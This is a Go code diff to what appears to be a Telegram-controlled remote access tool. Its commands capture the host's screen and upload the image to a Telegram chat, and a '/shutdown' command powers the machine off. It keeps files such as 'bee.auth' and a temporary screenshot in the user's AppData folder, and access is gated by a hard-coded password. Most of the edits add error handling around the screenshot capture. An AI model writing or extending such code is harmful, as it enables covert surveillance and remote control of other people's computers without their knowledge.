@@ -50,15 +50,16 @@ func Screenshot(userName string) []byte {
 
 	img, err := screenshot.CaptureRect(bounds)
 	if err != nil {
-		panic(err)
+		return nil
+	} else {
+		fileName := fmt.Sprintf("C:\\Users\\" + userName + "\\AppData\\Local\\scr.png")
+		file, _ := os.Create(fileName)
+		defer file.Close()
+		png.Encode(file, img)
+		buf := new(bytes.Buffer)
+		png.Encode(buf, img)
+		return buf.Bytes()
 	}
-	fileName := fmt.Sprintf("C:\\Users\\" + userName + "\\AppData\\Local\\scr.png")
-	file, _ := os.Create(fileName)
-	defer file.Close()
-	png.Encode(file, img)
-	buf := new(bytes.Buffer)
-	png.Encode(buf, img)
-	return buf.Bytes()
 }
 
 func httpGet(url string) string {
@@ -99,7 +100,6 @@ func Exec() {
 					if blocks[1] == PASSWD {
 						TGCHATID = update.Message.Chat.ID
 						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Logged in successfully!")
-						removefile("auth_token.txt")
 						writetofile("C:\\Users\\"+username+"\\AppData\\Local\\bee.auth", strconv.FormatInt(TGCHATID, 10))
 						msg.ReplyToMessageID = update.Message.MessageID
 						bot.Send(msg)
@@ -116,13 +116,20 @@ func Exec() {
 			} else {
 				if blocks[0] == "/screenshot" {
 					scrBytes := Screenshot(username)
-					photoFileBytes := tgbotapi.FileBytes{
-						Name:  "picture",
-						Bytes: scrBytes,
+					if scrBytes != nil {
+
+						photoFileBytes := tgbotapi.FileBytes{
+							Name:  "picture",
+							Bytes: scrBytes,
+						}
+						photo := tgbotapi.NewPhotoUpload(update.Message.Chat.ID, photoFileBytes)
+						bot.Send(photo)
+						removefile("C:\\Users\\" + username + "\\AppData\\Local\\scr.png")
+					} else {
+						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Error while taking screenshot!")
+						msg.ReplyToMessageID = update.Message.MessageID
+						bot.Send(msg)
 					}
-					photo := tgbotapi.NewPhotoUpload(update.Message.Chat.ID, photoFileBytes)
-					bot.Send(photo)
-					removefile("C:\\Users\\" + username + "\\AppData\\Local\\scr.png")
 				} else if blocks[0] == "/shutdown" {
 					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Shutting down...")
 					msg.ReplyToMessageID = update.Message.MessageID
@@ -188,7 +195,7 @@ func removefile(path string) {
 }
 
 var PASSWD = "password!"                                       // Your password to use telegram administration panel
-var TGTOKEN = "" // Your telegram bot token
+var TGTOKEN = "" 					       // Your telegram bot token
 var TGCHATID int64 = 0                                         // Don't change this!
 var username = ""                                              // Also don't change this!
 
